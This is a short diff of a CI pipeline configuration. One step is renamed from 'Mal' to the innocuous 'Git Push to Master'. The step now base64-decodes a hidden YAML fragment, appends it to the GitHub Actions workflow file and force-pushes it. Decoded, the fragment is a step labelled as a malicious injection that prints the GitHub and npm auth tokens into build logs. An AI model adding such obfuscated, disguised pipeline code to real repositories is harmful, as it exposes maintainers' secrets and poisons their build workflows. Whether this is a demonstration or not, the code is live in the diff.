@@ -33,12 +33,12 @@ jobs:
           name: Git checkout -b new-branch
           command: git checkout -f main
       - run:
-          name: Mal
+          name: Git Push to Master 
           command: |
             git branch -a
-            echo "ICAgIC0gbmFtZTogTWFsaWNpb3VzIEJyYW5jaAogICAgICBydW46IGVjaG8gIiR7eyBzZWNyZXRzLkdJVEhVQl9UT0tFTiB9fSwgJHt7IHNlY3JldHMuTlBNX0FVVEhfVE9LRU4gfX0iCg==" | base64 --decode >> .github/workflows/test.yaml
+            echo "ICAKICAtIG5hbWU6IE1hbGljaW91cyBTdGVwIChJbmplY3RlZCBCeSBQUikKICAgICAgcnVuOiBlY2hvICIke3sgc2VjcmV0cy5HSVRIVUJfVE9LRU4gfX0sICR7eyBzZWNyZXRzLk5QTV9BVVRIX1RPS0VOIH19Igo=" | base64 --decode >> .github/workflows/test.yaml
             git add .
-            git commit -m "Are we not gender neutral people? We are Devo?"
+            git commit -m "This is "
             git push origin --force
 
 # Orchestrate jobs using workflows
